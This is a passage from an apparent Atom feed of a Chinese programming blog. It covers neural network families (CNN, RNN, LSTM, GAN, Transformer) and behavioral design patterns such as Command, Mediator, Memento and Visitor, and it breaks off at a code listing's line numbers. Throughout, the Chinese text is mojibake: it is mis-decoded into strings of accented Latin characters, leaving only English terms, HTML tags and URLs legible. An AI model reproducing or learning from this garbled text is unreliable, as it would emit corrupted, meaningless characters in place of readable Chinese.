&lt;p>&lt;strong>å·ç§¯ç¥ç»ç½‘ç»œï¼ˆConvolutional Neural Networks, CNNsï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ç‰¹åˆ«é€‚ç”¨äºå¤„ç†å›¾åƒæ•°æ®ã€‚é€šè¿‡å·ç§¯å±‚ï¼ŒCNNèƒ½å¤Ÿæ•æ‰å›¾åƒä¸­çš„å±€éƒ¨ç‰¹å¾ã€‚&lt;/li>
&lt;li>å¹¿æ³›åº”ç”¨äºå›¾åƒåˆ†ç±»ã€ç‰©ä½“æ£€æµ‹ã€å›¾åƒåˆ†å‰²ç­‰ä»»åŠ¡ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRecurrent Neural Networks, RNNsï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>è®¾è®¡ç”¨æ¥å¤„ç†åºåˆ—æ•°æ®ï¼Œå¦‚æ—¶é—´åºåˆ—æ•°æ®æˆ–è‡ªç„¶è¯­è¨€ã€‚&lt;/li>
&lt;li>RNNèƒ½å¤Ÿå¤„ç†è¾“å…¥æ•°æ®çš„æ—¶é—´åŠ¨æ€ç‰¹æ€§ï¼Œé€‚ç”¨äºè¯­éŸ³è¯†åˆ«ã€è¯­è¨€å»ºæ¨¡ç­‰ä»»åŠ¡ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>é•¿çŸ­æ—¶è®°å¿†ç½‘ç»œï¼ˆLong Short-Term Memory, LSTMï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>LSTMæ˜¯RNNçš„ä¸€ç§å˜ä½“ï¼Œå®ƒèƒ½å¤Ÿå­¦ä¹ é•¿æœŸä¾èµ–å…³ç³»ï¼Œè§£å†³äº†æ™®é€šRNNéš¾ä»¥æ•æ‰é•¿æœŸä¾èµ–çš„é—®é¢˜ã€‚&lt;/li>
&lt;li>å¸¸ç”¨äºå¤æ‚çš„åºåˆ—ä»»åŠ¡ï¼Œå¦‚æœºå™¨ç¿»è¯‘ã€æ–‡æœ¬ç”Ÿæˆç­‰ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ç”Ÿæˆå¯¹æŠ—ç½‘ç»œï¼ˆGenerative Adversarial Networks, GANsï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šç”Ÿæˆå™¨å’Œé‰´åˆ«å™¨ã€‚GANsèƒ½å¤Ÿç”Ÿæˆæ–°çš„ã€ä¸çœŸå®æ•°æ®ç±»ä¼¼çš„æ•°æ®ã€‚&lt;/li>
&lt;li>åº”ç”¨äºå›¾åƒç”Ÿæˆã€å›¾åƒé£æ ¼è½¬æ¢ç­‰é¢†åŸŸã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å˜æ¢å™¨ç½‘ç»œï¼ˆTransformer Networksï¼‰&lt;/strong>:&lt;/p>
&lt;ul>
&lt;li>ä¸»è¦ç”¨äºå¤„ç†åºåˆ—æ•°æ®ï¼Œç‰¹åˆ«æ˜¯åœ¨è‡ªç„¶è¯­è¨€å¤„ç†é¢†åŸŸè¡¨ç°å‡ºè‰²ã€‚&lt;/li>
&lt;li>ä¾èµ–äºâ€œæ³¨æ„åŠ›æœºåˆ¶â€ï¼Œèƒ½å¤ŸåŒæ—¶å¤„ç†æ•´ä¸ªåºåˆ—ï¼Œæé«˜äº†å¤„ç†é•¿åºåˆ—çš„èƒ½åŠ›ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>è¿™äº›ç½‘ç»œå¯ä»¥æ ¹æ®å…·ä½“é—®é¢˜å’Œæ•°æ®ç±»å‹è¿›è¡Œé€‰æ‹©å’Œå®šåˆ¶ã€‚&lt;/p></content><category scheme="https://mincodes.com/tags/ai/" term="Ai" label="Ai"/><category scheme="https://mincodes.com/tags/deep-learning/" term="Deep-Learning" label="Deep-Learning"/></entry><entry><title type="text">è®¾è®¡æ¨¡å¼ï¼šè¡Œä¸ºå‹ (Behavioral)</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/design-patterns-behavioral/"/><id>https://mincodes.com/posts/design-patterns-behavioral/</id><updated>2023-07-24T21:16:06+08:00</updated><published>2023-07-07T18:36:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">è®¾è®¡æ¨¡å¼æ€»ç›®å½•è¯·å‚è€ƒï¼šè®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢ã€‚ è´£ä»»é“¾ (Chain of Responsibility) æ„å›¾ ä½¿å¤šä¸ªå¯¹è±¡éƒ½æœ‰æœºä¼šå¤„ç†è¯·æ±‚ï¼Œä»â€¦</summary><content type="html">&lt;p>è®¾è®¡æ¨¡å¼æ€»ç›®å½•è¯·å‚è€ƒï¼š&lt;a href="https://mincodes.com/posts/design-patterns/#è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢">è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢&lt;/a>ã€‚&lt;/p>
&lt;h2 id="è´£ä»»é“¾--chain-of-responsibility">è´£ä»»é“¾ (Chain of Responsibility)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>ä½¿å¤šä¸ªå¯¹è±¡éƒ½æœ‰æœºä¼šå¤„ç†è¯·æ±‚ï¼Œä»è€Œé¿å…è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…ä¹‹é—´çš„è€¦åˆå…³ç³»ã€‚å°†è¿™äº›å¯¹è±¡è¿æˆä¸€æ¡é“¾ï¼Œå¹¶æ²¿ç€è¿™æ¡é“¾ä¼ é€’è¯¥è¯·æ±‚ï¼Œç›´åˆ°æœ‰ä¸€ä¸ªå¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="æ¡ˆä¾‹">æ¡ˆä¾‹&lt;/h3>
&lt;p>Android çš„äº‹ä»¶ä¼ é€’æœºåˆ¶å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„è´£ä»»é“¾æ¨¡å¼çš„åº”ç”¨ã€‚è¯¥åº”ç”¨ç»“åˆäº† &lt;a href="https://mincodes.com/posts/design-patterns-structural/#ç»„åˆ--composite">ç»„åˆ
(Composite)&lt;/a> æ¨¡å¼ï¼Œåˆ©ç”¨å·²æœ‰çš„è§†å›¾æ ‘ç»“æ„ï¼Œå°†è¯·æ±‚ä»è§†å›¾æ ‘çš„æ ¹èŠ‚ç‚¹ï¼ˆDecorViewï¼‰ä¸€ç›´æ´¾å‘åˆ°å„ä¸ªå­èŠ‚ç‚¹ï¼Œç›´åˆ°æŸä¸ªè§†å›¾å¤„ç†è¯¥äº‹ä»¶ä¸ºæ­¢ã€‚&lt;/p>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#ç»„åˆ--composite">ç»„åˆ (Composite)&lt;/a>: å¯ä»¥åˆ©ç”¨å·²æœ‰çš„ Composite ç»“æ„æ¥ä¼ é€’è¯·æ±‚ï¼Œå½¢æˆè´£ä»»é“¾ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="å‘½ä»¤--command">å‘½ä»¤ (Command)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>å°†æŸç§è¯·æ±‚å°è£…ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œæ¢å¥è¯è¯´ï¼Œå°†è¯·æ±‚å‚æ•°åŒ–ï¼Œè¿™æ ·å¯ä»¥è§£è€¦è¯·æ±‚çš„åˆ›å»ºæ–¹å’Œå®ç°æ–¹ï¼Œä¹Ÿæ–¹ä¾¿å¯¹è¯·æ±‚è¿›è¡Œæ’é˜Ÿã€è®°å½•æ—¥å¿—ï¼Œä»¥åŠæ”¯æŒæ’¤é”€ç­‰æ“ä½œã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="ç»“æ„">ç»“æ„&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/command-class.png">
&lt;/figure>
&lt;h3 id="ç”¨æ³•ä»‹ç»">ç”¨æ³•ä»‹ç»&lt;/h3>
&lt;h4 id="å®ç°èœå•-æŒ‰é’®åŠŸèƒ½">å®ç°èœå•ã€æŒ‰é’®åŠŸèƒ½&lt;/h4>
&lt;p>Command æ¨¡å¼ç‰¹åˆ«é€‚åˆç”¨æ¥å®ç°èœå•ã€æŒ‰é’®çš„åŠŸèƒ½ã€‚ç”¨ Command æ¨¡å¼å®ç°æœ‰å¦‚ä¸‹å¥½å¤„ï¼š&lt;/p>
&lt;ul>
&lt;li>å¯ä»¥å¾ˆæ–¹ä¾¿çš„è®©ä¸€ä¸ªèœå•å’Œä¸€ä¸ªæŒ‰é’®ä»£è¡¨åŒä¸€é¡¹åŠŸèƒ½ï¼Œåªéœ€è®©äºŒè€…å…±äº«åŒä¸€ä¸ª Command
å¯¹è±¡å³å¯ã€‚&lt;/li>
&lt;li>å¯ä»¥å¾ˆè½»æ¾çš„åŠ¨æ€æ›¿æ¢æŸé¡¹èœå•æˆ–æŒ‰é’®çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚å®ç°ä¸Šä¸‹æ–‡æœ‰å…³çš„èœå•ï¼‰ï¼Œåªéœ€åŠ¨æ€æ›¿æ¢ Command å¯¹è±¡å³å¯ã€‚&lt;/li>
&lt;li>è¿˜å¯ä»¥å¾ˆæ–¹ä¾¿å°†è‹¥å¹²ä¸ªå‘½ä»¤ç»„åˆæˆä¸€ä¸ªæ›´å¤§çš„å‘½ä»¤ï¼Œå®ç°å‘½ä»¤è„šæœ¬ï¼ˆcommand scriptingï¼‰åŠŸèƒ½ã€‚å‚è€ƒ &lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#macrocommand-%E5%AE%8F%E5%91%BD%E4%BB%A4">MacroCommand å®å‘½ä»¤&lt;/a>ã€‚&lt;/li>
&lt;/ul>
&lt;h4 id="macrocommand-å®å‘½ä»¤">MacroCommand å®å‘½ä»¤&lt;/h4>
&lt;p>&lt;code>MacroCommand&lt;/code> æ˜¯ä¸€ä¸ªå…·ä½“çš„ &lt;code>Command&lt;/code> å­ç±»ï¼Œå®ƒç”¨æ¥æ‰§è¡Œä¸€ä¸ªå‘½ä»¤åºåˆ—ã€‚ &lt;code>MacroCommand&lt;/code> è¿ç”¨äº†&lt;a href="https://mincodes.com/posts/design-patterns-structural/#ç»„åˆ--composite">Composite ç»„åˆ&lt;/a>æ¨¡å¼æ¥å®ç°è¿™ç§å±‚æ¬¡ç»“æ„ï¼Œå‚è€ƒä¸‹é¢çš„ç±»å›¾ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/macro-command-class.png">
&lt;/figure>
&lt;h3 id="åä½œ">åä½œ&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/command-sequence.svg">
&lt;/figure>
&lt;h2 id="è§£é‡Šå™¨--interpreter">è§£é‡Šå™¨ (Interpreter)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>ç»™å®šä¸€ä¸ªè¯­è¨€ï¼Œå®šä¹‰å®ƒçš„æ–‡æ³•çš„ä¸€ç§è¡¨ç¤ºï¼Œå¹¶å®šä¹‰ä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¿™ä¸ªè§£é‡Šå™¨ä½¿ç”¨è¯¥è¡¨ç¤ºæ¥è§£é‡Šè¯­è¨€ä¸­çš„å¥å­ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="åŠ¨æœº">åŠ¨æœº&lt;/h3>
&lt;p>å¦‚æœä¸€ç§ç‰¹å®šç±»å‹çš„é—®é¢˜å‘ç”Ÿçš„é¢‘ç‡è¶³å¤Ÿé«˜ï¼Œé‚£ä¹ˆå¯èƒ½å°±å€¼å¾—å°†è¯¥é—®é¢˜çš„å„ä¸ªå®ä¾‹è¡¨è¿°ä¸ºä¸€ä¸ªç®€å•è¯­è¨€ä¸­çš„å¥å­ã€‚è¿™æ ·å°±å¯ä»¥æ„å»ºä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¯¥è§£é‡Šå™¨é€šè¿‡è§£é‡Šè¿™äº›å¥å­æ¥è§£å†³è¯¥é—®é¢˜ã€‚&lt;/p>
&lt;h3 id="æ¡ˆä¾‹">æ¡ˆä¾‹&lt;/h3>
&lt;p>æœç´¢åŒ¹é…ä¸€ä¸ªæ¨¡å¼çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªå¸¸è§é—®é¢˜ã€‚æ­£åˆ™è¡¨è¾¾å¼æ˜¯æè¿°å­—ç¬¦ä¸²æ¨¡å¼çš„ä¸€ç§æ ‡å‡†è¯­è¨€ã€‚ä¸å…¶ä¸ºæ¯ä¸€ä¸ªæ¨¡å¼éƒ½æ„é€ ä¸€ä¸ªç‰¹å®šçš„ç®—æ³•ï¼Œä¸å¦‚ä½¿ç”¨ä¸€ç§é€šç”¨çš„æœç´¢ç®—æ³•æ¥è§£é‡Šæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚&lt;/p>
&lt;h2 id="è¿­ä»£å™¨--iterator">è¿­ä»£å™¨ (Iterator)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>æä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­çš„å„ä¸ªå…ƒç´ ï¼Œè€Œåˆä¸éœ€è¦æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="ç±»å›¾">ç±»å›¾&lt;/h3>
&lt;p>è¿­ä»£å™¨æ¨¡å¼åº”ç”¨å¹¿æ³›ï¼ŒåŸç†ä¹Ÿæ¯”è¾ƒç®€å•ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå…¸å‹çš„ç±»å›¾ã€‚&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/iterator-class.png">
&lt;/figure>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#ç»„åˆ--composite">ç»„åˆ (Composite)&lt;/a>: è¿­ä»£å™¨å¯ä»¥è¢«ç”¨æ¥è¿­ä»£ç»„åˆæ¨¡å¼ä¸­çš„å¯¹è±¡ã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-creational/#å·¥å‚æ–¹æ³•--factory-method">å·¥å‚æ–¹æ³• (Factory Method)&lt;/a>: å¦‚ä¸Šé¢çš„ç±»å›¾æ‰€ç¤ºï¼Œè¿­ä»£å™¨ä¸­åˆ©ç”¨äº†å·¥å‚æ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹åº”çš„è¿­ä»£å™¨å­ç±»ã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#%E5%A4%87%E5%BF%98%E5%BD%95--memento">å¤‡å¿˜å½• (Memento)&lt;/a>: è¿­ä»£å™¨å¯ä½¿ç”¨ memento æ¥æ•è·ä¸€ä¸ªè¿­ä»£çš„çŠ¶æ€ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="ä¸­ä»‹è€…--mediator">ä¸­ä»‹è€… (Mediator)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>ç”¨ä¸€ä¸ªä¸­ä»‹å¯¹è±¡æ¥å°è£…ä¸€ç³»åˆ—çš„å¯¹è±¡äº¤äº’ã€‚ä¸­ä»‹è€…ä½¿å„å¯¹è±¡ä¸éœ€è¦æ˜¾å¼åœ°ç›¸äº’å¼•ç”¨ï¼Œä»è€Œä½¿å…¶è€¦åˆæ¾æ•£ï¼Œè€Œä¸”å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜å®ƒä»¬ä¹‹é—´çš„äº¤äº’ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="ç»“æ„">ç»“æ„&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/mediator-class.png">
&lt;/figure>
&lt;h3 id="æ•ˆæœ">æ•ˆæœ&lt;/h3>
&lt;dl>
&lt;dt>å‡å°‘äº†å­ç±»ç”Ÿæˆ&lt;/dt>
&lt;dd>Mediator å°†åŸæœ¬åˆ†å¸ƒäºå¤šä¸ªå¯¹è±¡é—´çš„è¡Œä¸ºé›†ä¸­åœ¨ä¸€èµ·ã€‚æ”¹å˜è¿™äº›è¡Œä¸ºåªéœ€è¦ç”Ÿæˆ Mediator çš„å­ç±»å³å¯ï¼Œè¿™æ ·å„ä¸ª Colleague ç±»å¯è¢«å¤ç”¨ã€‚&lt;/dd>
&lt;dt>å°†å„ Colleague è§£è€¦&lt;/dt>
&lt;dd>Mediator æœ‰åˆ©äºå„ Colleague é—´çš„æ¾è€¦åˆï¼Œä½ å¯ä»¥ç‹¬ç«‹åœ°æ”¹å˜å’Œå¤ç”¨å„ Colleague ç±»å’Œ Mediator ç±»ã€‚&lt;/dd>
&lt;dt>ç®€åŒ–äº†å¯¹è±¡åè®®&lt;/dt>
&lt;dd>ç”¨ Mediator å’Œå„ Colleague é—´çš„ä¸€å¯¹å¤šäº¤äº’æ¥ä»£æ›¿ Colleague é—´çš„å¤šå¯¹å¤šäº¤äº’ã€‚ä¸€å¯¹å¤šçš„å…³ç³»æ›´æ˜“äºç†è§£ã€ç»´æŠ¤å’Œæ‰©å±•ã€‚&lt;/dd>
&lt;dt>å¯¹å¯¹è±¡å¦‚ä½•åä½œè¿›è¡Œäº†æŠ½è±¡&lt;/dt>
&lt;dd>å°†ä¸­ä»‹ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„æ¦‚å¿µå¹¶å°†å…¶å°è£…åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œä½¿ä½ å°†æ³¨æ„åŠ›ä»å¯¹è±¡å„è‡ªæœ¬èº«çš„è¡Œä¸ºè½¬ç§»åˆ°å®ƒä»¬ä¹‹é—´çš„äº¤äº’ä¸Šæ¥ã€‚è¿™æœ‰åŠ©äºå¼„æ¸…æ¥šä¸€ä¸ªç³»ç»Ÿä¸­çš„å¯¹è±¡æ˜¯å¦‚ä½•äº¤äº’çš„ã€‚&lt;/dd>
&lt;dt>ä½¿æ§åˆ¶é›†ä¸­åŒ–&lt;/dt>
&lt;dd>ä¸­ä»‹è€…æ¨¡å¼å°†äº¤äº’çš„å¤æ‚æ€§å˜ä¸ºä¸­ä»‹è€…çš„å¤æ‚æ€§ã€‚å› ä¸ºä¸­ä»‹è€…å°è£…äº†åè®®ï¼Œè¿™ä¼šå¸¦æ¥ä¸Šè¿°æåˆ°çš„å¥½å¤„ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´è¯¥å¯¹è±¡å˜å¾—æ¯”è¾ƒå¤æ‚å’Œéš¾ä»¥ç»´æŠ¤ã€‚&lt;/dd>
&lt;/dl>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#å¤–è§‚--facade">å¤–è§‚ (Facade)&lt;/a>: Facade æ¨¡å¼ä¸ä¸­ä»‹è€…çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œå®ƒæ˜¯å¯¹ä¸€ä¸ªå­ç³»ç»Ÿè¿›è¡ŒæŠ½è±¡ï¼Œä»è€Œæä¾›ä¸€ä¸ªæ›´ä¸ºæ–¹ä¾¿çš„æ¥å£ã€‚å®ƒçš„åè®®ä¸»è¦æ˜¯å•å‘çš„ï¼Œå³é€šè¿‡ Facade æ¥å£æ¥è®¿é—®å­ç³»ç»Ÿã€‚ç›¸åï¼ŒMediator æä¾›äº†å„ Colleague å¯¹è±¡ä¸æ”¯æŒçš„åä½œè¡Œä¸ºï¼Œè€Œä¸”åè®®æ˜¯å¤šå‘çš„ã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#%E8%A7%82%E5%AF%9F%E8%80%85--observer">è§‚å¯Ÿè€… (Observer)&lt;/a>: Mediator å¯ä»¥ä½œä¸ºä¸€ä¸ª Observer æ¥è®¢é˜…å„ Colleague çš„çŠ¶æ€å˜åŒ–ï¼Œå¹¶åšå‡ºå“åº”ï¼ˆä¾‹å¦‚å°†çŠ¶æ€å˜åŒ–çš„ç»“æœä¼ æ’­ç»™å…¶ä»–çš„ Colleagueï¼‰ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="å¤‡å¿˜å½•--memento">å¤‡å¿˜å½• (Memento)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>åœ¨ä¸ç ´åå°è£…æ€§çš„å‰æä¸‹ï¼Œæ•è·ä¸€ä¸ªå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ï¼Œå¹¶åœ¨è¯¥å¯¹è±¡ä¹‹å¤–ä¿å­˜è¿™ä¸ªçŠ¶æ€ã€‚è¿™æ ·ä»¥åå°±å¯ä»¥å°†è¯¥å¯¹è±¡æ¢å¤åˆ°åŸå…ˆä¿å­˜çš„çŠ¶æ€ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="ç»“æ„">ç»“æ„&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/memento-class.png">
&lt;/figure>
&lt;h4 id="memento-å¤‡å¿˜å½•">Memento å¤‡å¿˜å½•&lt;/h4>
&lt;ul>
&lt;li>å¤‡å¿˜å½•å­˜å‚¨åŸå‘å™¨å¯¹è±¡çš„å†…éƒ¨çŠ¶æ€ã€‚åŸå‘å™¨æ ¹æ®éœ€è¦å†³å®šå¤‡å¿˜å½•å­˜å‚¨åŸå‘å™¨çš„å“ªäº›å†…éƒ¨çŠ¶æ€ã€‚&lt;/li>
&lt;li>é˜²æ­¢åŸå‘å™¨ä»¥å¤–çš„å…¶ä»–å¯¹è±¡è®¿é—®å¤‡å¿˜å½•ã€‚å¤‡å¿˜å½•å®é™…ä¸Šæœ‰ä¸¤ä¸ªæ¥å£ï¼Œç®¡ç†è€…ï¼ˆCaretakerï¼‰åªèƒ½çœ‹åˆ°å¤‡å¿˜å½•çš„ &lt;strong>çª„æ¥å£&lt;/strong> ï¼ˆåªèƒ½å°†å¤‡å¿˜å½•ä¼ é€’ç»™å…¶ä»–å¯¹è±¡ï¼‰ï¼Œè€ŒåŸå‘å™¨èƒ½å¤Ÿçœ‹åˆ°ä¸€ä¸ªâ€‹&lt;strong>å®½æ¥å£&lt;/strong>, å…è®¸å®ƒè®¿é—®æ¢å¤åˆ°å…ˆå‰çŠ¶æ€æ‰€éœ€çš„æ‰€æœ‰æ•°æ®ã€‚&lt;/li>
&lt;/ul>
&lt;h4 id="originator-åŸå‘å™¨">Originator åŸå‘å™¨&lt;/h4>
&lt;ul>
&lt;li>åŸå‘å™¨åˆ›å»ºä¸€ä¸ªå¤‡å¿˜å½•ï¼Œç”¨ä»¥è®°å½•å½“å‰æ—¶åˆ»å®ƒçš„å†…éƒ¨çŠ¶æ€ã€‚&lt;/li>
&lt;li>ä½¿ç”¨å¤‡å¿˜å½•æ¢å¤å†…éƒ¨çŠ¶æ€ã€‚&lt;/li>
&lt;/ul>
&lt;h4 id="caretaker-ç®¡ç†è€…-ä¾‹å¦‚-æ’¤é”€æœºåˆ¶">Caretaker ç®¡ç†è€…ï¼Œä¾‹å¦‚â€œæ’¤é”€æœºåˆ¶â€&lt;/h4>
&lt;ul>
&lt;li>è´Ÿè´£ä¿å­˜å¥½å¤‡å¿˜å½•&lt;/li>
&lt;li>ä¸èƒ½å¯¹å¤‡å¿˜å½•çš„å†…å®¹è¿›è¡Œæ“ä½œæˆ–æ£€æŸ¥ã€‚&lt;/li>
&lt;/ul>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#%E5%91%BD%E4%BB%A4--command">Command å‘½ä»¤&lt;/a>: å‘½ä»¤å¯ä½¿ç”¨å¤‡å¿˜å½•æ¥ä¸ºå¯æ’¤é”€çš„æ“ä½œç»´æŠ¤çŠ¶æ€ã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#%E8%BF%AD%E4%BB%A3%E5%99%A8--iterator">Iterator è¿­ä»£å™¨&lt;/a>: å¤‡å¿˜å½•å¯ç”¨äºè¿­ä»£å™¨çš„å®ç°ï¼Œç”¨äºå­˜å‚¨è¿­ä»£å™¨çš„å½“å‰çŠ¶æ€ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="è§‚å¯Ÿè€…--observer">è§‚å¯Ÿè€… (Observer)&lt;/h2>
&lt;h2 id="çŠ¶æ€--state">çŠ¶æ€ (State)&lt;/h2>
&lt;h2 id="ç­–ç•¥--strategy">ç­–ç•¥ (Strategy)&lt;/h2>
&lt;h2 id="æ¨¡æ¿æ–¹æ³•--template-method">æ¨¡æ¿æ–¹æ³• (Template Method)&lt;/h2>
&lt;h2 id="è®¿é—®è€…--visitor">è®¿é—®è€… (Visitor)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>å½“æˆ‘ä»¬éå†ä¸€ä¸ªå¯¹è±¡ç»“æ„çš„å…ƒç´ æ—¶ï¼Œè¯¥æ¨¡å¼å…è®¸æˆ‘ä»¬åœ¨ä¸ä¿®æ”¹å„ä¸ªå…ƒç´ çš„ç±»ç»“æ„çš„å‰æä¸‹ï¼Œä¸ºæ¯ä¸ªå…ƒç´ å¢åŠ ä»»æ„ç±»å‹çš„æ–°æ“ä½œã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="æ¡ˆä¾‹-å¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹">æ¡ˆä¾‹ï¼šå¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹&lt;/h3>
&lt;h4 id="å¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹">å¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹&lt;/h4>
&lt;p>å‡è®¾æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªå¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹ï¼Œè¯¥æ¨¡å‹çš„ç»“æ„ç±»ä¼¼ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/visitor-page-tree.svg">
&lt;/figure>
&lt;p>å¯¹åº”çš„ç±»å›¾å¦‚ä¸‹ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/visitor-page-class.png">
&lt;/figure>
&lt;h4 id="ç»Ÿè®¡å­—ç¬¦ä¸ªæ•°">ç»Ÿè®¡å­—ç¬¦ä¸ªæ•°&lt;/h4>
&lt;p>æˆ‘ä»¬å¸Œæœ›ä¸ºä¸Šè¿°æ–‡æ¡£ç»“æ„å¢åŠ å­—ç¬¦ä¸ªæ•°ç»Ÿè®¡åŠŸèƒ½ï¼Œä¸€ä¸ªç®€å•çš„å®ç°å¯èƒ½ç±»ä¼¼è¿™æ ·ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
